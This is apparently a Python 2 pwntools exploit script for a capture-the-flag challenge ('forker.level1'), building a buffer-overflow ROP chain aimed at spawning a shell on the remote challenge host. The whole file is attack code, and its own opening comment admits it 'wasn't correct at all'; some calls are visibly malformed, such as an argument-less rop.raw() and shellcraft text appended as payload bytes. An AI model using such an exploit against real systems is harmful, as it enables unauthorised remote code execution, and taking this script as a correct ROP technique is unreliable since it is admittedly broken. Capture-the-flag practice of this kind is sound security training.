#!/usr/bin/env python2

#This wasn't correct at all, couldn't find pop rdx gadget

from pwn import *

buf_size = 0x4c
rip_offset = 0x50 + 8 # rbp - buf = 0x50; saved rip - buf = 8
correct_addr = 0x400b4f
pop_rdi = 0x400c13
pop_rsi_r15 = 0x400c11
password = 0x400c7e
password_len = 32
percent_s = 0x400d4b # %s.

r = remote('forker1.wpictf.xyz', 31337)

binary = ELF('./forker.level1')
context.binary = binary
payload = 'a'*buf_size + p8(rip_offset)

rop = ROP(binary)
payload += rop.raw(pop_rdi) + rop.raw(4)
payload += rop.raw(pop_rsi_r15) + rop.raw(percent_s) + rop.raw(0xdeadbeefcafebabe)
payload += rop.raw()
payload += ROP(binary).execve(binary.symbols['binsh'], 0, 0)
payload += shellcraft.dupsh(4)
r.sendline(payload)

# r.shutdown('send')
# r.stream()
r.interactive()
